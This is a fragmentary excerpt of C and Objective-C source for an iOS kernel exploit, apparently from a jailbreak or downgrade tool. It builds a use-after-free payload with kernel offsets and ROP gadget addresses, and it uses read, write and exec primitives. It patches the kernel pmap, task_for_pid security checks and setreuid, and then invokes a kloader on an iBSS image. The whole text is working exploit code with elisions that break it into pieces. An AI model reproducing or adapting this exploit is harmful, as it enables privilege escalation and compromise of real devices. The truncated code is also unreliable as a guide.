...
uint32_t kern_base = 0xdeadbeef;
uint32_t kern_tramp_phys = 0x9bf00000;
uint32_t larm_init_tramp = 0xdeadbeef;
uint32_t flush_dcache = 0xdeadbeef;
uint32_t invalidate_icache = 0xdeadbeef;

int kloader(char *argv)
{
    int argc = 3;
...
uint32_t write_gadget = 0xc73e8; // address of "str r1, [r0, #0xc] ; bx lr"
...
void *insert_payload(void *ptr) {
    ...
    *(uint32_t *)clock_ops_overwrite += kernel_base;
    *(uint32_t *)(clock_ops_overwrite+0xC) += kernel_base;
    *(uint32_t *)(clock_ops_overwrite+0x10) += kernel_base;
    
    *(uint32_t *)uaf_payload_buffer = (uint32_t)clock_ops_overwrite;
    *(uint32_t *)(uaf_payload_buffer+0x4) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x8) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x10) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x14) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x1C) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x20) += kernel_base;
    *(uint32_t *)(uaf_payload_buffer+0x24) += kernel_base;
...
void patch_kernel_pmap(uint32_t kernel_base) {
    uint32_t kernel_pmap = 0x3f6454 + kernel_base;
    ...
    uint32_t flush_dcache = 0xbc260 + kernel_base;
    exec_primitive(flush_dcache, 0, 0);
    
    uint32_t invalidate_tlb = 0xc7440 + kernel_base;
    exec_primitive(invalidate_tlb, 0, 0);
}

void patch_task_for_pid(uint32_t kernel_base) {
    uint32_t task_for_pid_base = 0x2FCD80 + kernel_base;
    
    uint32_t pid_check_addr = 0x14 + task_for_pid_base;
    write_primitive(pid_check_addr, read_primitive(pid_check_addr) + 0xff); // cmp r6, #ff
    
    uint32_t posix_check_ret_addr = 0x3e + task_for_pid_base;
    write_primitive(posix_check_ret_addr, read_primitive(posix_check_ret_addr) + 0xff); // cmp r0, #ff
    
    uint32_t mac_proc_check_ret_addr = 0x1e6 + task_for_pid_base;
...
void patch_setreuid(uint32_t kernel_base, mach_port_name_t kernel_task) {
    uint32_t setreuid_base = 0x2A985C + kernel_base;
...
void exploit(uint32_t kernel_base) {
    ...
    WRITE_IN(data, kernel_base+0x318265);                                    // [10] address of OSSerializer::serialize
    ...
    printf("i love drugs\n");
    vm_kernel_addrperm = read_primitive(kernel_base+0x455848-4);
    ...
    NSString *ibssPath = [[NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingString:@"/iBSS"];
    kloader((char*)[ibssPath UTF8String]);
